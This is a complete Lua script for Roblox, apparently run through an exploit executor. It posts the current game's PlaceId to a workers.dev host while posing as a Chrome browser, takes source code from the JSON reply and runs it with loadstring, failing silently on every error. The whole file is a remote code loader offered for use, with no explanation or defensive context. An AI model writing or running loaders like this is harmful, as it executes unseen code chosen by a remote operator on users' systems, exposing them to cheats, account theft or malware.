local HttpService = game:GetService("HttpService")
local http = request or http_request or (syn and syn.request) or (http and http.request)

if not http then return end

local success, response = pcall(http, {
    Url = "https://workerb.lvlyvcbcla.workers.dev/",
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json",
        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    },
    Body = HttpService:JSONEncode({ placeId = game.PlaceId })
})

if not success or not response then return end

local body = response.Body or response.body or response.Data or response.data
if type(body) ~= "string" or #body == 0 then return end

local parseSuccess, decoded = pcall(function()
    return HttpService:JSONDecode(body)
end)

if not parseSuccess or type(decoded) ~= "table" then return end

local src = decoded.script or decoded.source or decoded.code
if type(src) ~= "string" or #src == 0 then return end

local chunk = loadstring(src)
if chunk then
    pcall(chunk)
end
